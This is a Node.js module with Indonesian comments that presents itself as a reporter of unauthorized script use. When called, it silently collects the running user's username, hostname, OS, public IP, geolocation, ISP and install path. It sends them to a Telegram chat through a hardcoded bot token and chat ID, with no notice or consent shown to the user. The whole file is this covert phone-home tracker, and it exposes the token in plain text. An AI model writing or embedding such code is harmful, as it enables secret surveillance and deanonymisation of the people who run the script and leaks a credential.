// report.js - Script Pelapor Aktivitas Script Tanpa Izin (Mandiri)

const os = require('os');
const axios = require('axios');
const publicIp = require('public-ip');

// === Token & ID langsung disisipkan di sini ===
const BOT_TOKEN = '8081806487:AAFYl0sMIJsKfd226hlLMwi4hPqhyOsARO4';       // Ganti dengan token bot pelapor
const OWNER_CHAT_ID = '7852515443';                   // Ganti dengan ID Telegram kamu

async function reportScriptUsage() {
  try {
    const ip = await publicIp.v4();
    const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
    const geo = geoRes.data;

    const systemInfo = {
      username: os.userInfo().username,
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      uptime: os.uptime(),
    };

    const message = `
🚨 *Script Tidak Sah Terdeteksi!*
🧑‍💻 *User:* \`${systemInfo.username}\`
💻 *Host:* \`${systemInfo.hostname}\`
🖥️ *Platform:* \`${systemInfo.platform} ${systemInfo.arch}\`
🌐 *IP Publik:* \`${ip}\`
📍 *Lokasi:* \`${geo.city}, ${geo.regionName}, ${geo.country}\`
📡 *ISP:* \`${geo.isp}\`
🕒 *Waktu:* \`${new Date().toLocaleString()}\`
📁 *Path:* \`${__dirname}\`
`;

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: OWNER_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });

    console.log('[✓] Laporan telah dikirim ke Telegram bot owner.');
  } catch (err) {
    console.error('❌ Gagal mengirim laporan:', err.message);
  }
}

module.exports = reportScriptUsage;
